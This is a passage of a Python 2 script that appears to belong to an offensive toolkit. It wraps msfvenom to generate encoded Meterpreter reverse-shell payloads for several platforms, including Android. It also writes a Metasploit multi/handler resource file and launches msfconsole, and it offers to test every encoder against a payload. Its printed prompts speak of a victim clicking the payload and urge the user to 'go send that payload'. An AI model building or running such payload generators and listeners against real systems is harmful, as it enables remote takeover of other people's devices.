            user_input.LHOST,
            user_input.LPORT,
            user_input.encoder,
            user_input.encoder_iterations,
            bad_Bytes,
            user_input.output_format,
            payload_file
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
        # generate a handler file
        print 'Creating handler directory and generating handler file'

        # handler_directory = '/root/ArmsCommander/payloads/'
        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
        # handler_fullpath = handler_directory + handler_filename
        handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')

        # write proper parameters to handler file
        print 'Writing to handler file'
        handler.write('use multi/handler')
        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
        # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
        handler.write("\nset PAYLOAD " + payload_Set)
        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
        handler.write('\nset LHOST 0.0.0.0')
        # handler.write("\nset LPORT {0}").format(user_input.LPORT)
        handler.write("\nset LPORT " + user_input.LPORT)
        handler.write('\nset ExitOnSession false')
        handler.write('\nexploit -j -z')

        # Inform user where the handler file is stored
        print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'

    else:
        print colored('You have entered a invalid option','red','on_white')
        Android_STAGED()
    main()
    return
def Platform_Android():
    opt_List = [
    '\n\t#0. Return to Main Menu',
    '#1. Android INLINE Meterpreter Reverse Shells',
    '#2. Android STAGED Meterpreter Reverse Shells'
    ]

    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "0":
        main()
    elif opt_Choice == "1":
        Android_INLINE()
    elif opt_Choice == "2":
        Android_STAGED()
    else:
        print colored('You have entered a invalid option','red','on_white')
        Platform_Android()
    return

def launch_msfconsole_handler():
    print 'Launching Metasploit with premade handler'
    print 'Make sure this handler is running BEFORE your victim clicks on the payload'
    print 'Handler/Listener running, go send that payload!'
    os.system('service postgresql start')
    # os.system('service metasploit start') # Deprecated Command apparently
    os.system('msfdb init')
    os.system('msfdb start')
    os.system('msfconsole -r /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc')
    os.system('db_status')
    return

def main():
    opt_List = [
        '\n\t#0. Return to Main Menu',
        '#1. Windows Reverse Shells',
        '#2. Mac OSX Reverse Shells',
        '#3. Linux Reverse Shells',
        '#4. Python Reverse Shells',
        '#5. Ruby Reverse Shells',
        '#6. Java Reverse Shells',
        '#7. Android Reverse Shells',
        '#8. Launch Metasploit Listener with your generated handler (Making a payload from #1 to 7 REQUIRED)',
        '# HELP. How to troubleshoot Reverse Shells in personal NATed networks',
        '# TEST ENCODERS. Specify a payload, and run all 39+ msfvenom encoders against it to determine whether or not it works'
    ]

    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Choose a PAYLOAD or type HELP: "))

    if opt_Choice == "1":
        os.system('clear')
        Platform_Windows()
    elif opt_Choice == "2":
        os.system('clear')
        Platform_OSX()
    elif opt_Choice == "3":
        os.system('clear')
        Platform_Linux()
    elif opt_Choice == "4":
        os.system('clear')
        Platform_Python()
    elif opt_Choice == "5":
        os.system('clear')
        Platform_Ruby()
        return
    elif opt_Choice == "6":
        os.system('clear')
        Platform_Java()
        return
    elif opt_Choice == "7":
        os.system('clear')
        Platform_Android()
        return
    elif opt_Choice == "8":
        os.system('clear')
        launch_msfconsole_handler()
    elif opt_Choice == "HELP":
        os.system('clear')
        os.system('cat EZPZ_HowTo.txt')
        main()
    elif opt_Choice == "0":
        os.system('python /root/ArmsCommander/ArmsCommander.py')
        # main()
    elif opt_Choice == "TEST" or "TEST ENCODERS" or "TESTER":
        test_Encoder_Effectiveness()
    else:
        print colored('You have entered a invalid option','red','on_white')
        main()
#if elif, and else statements go here
    return
main()
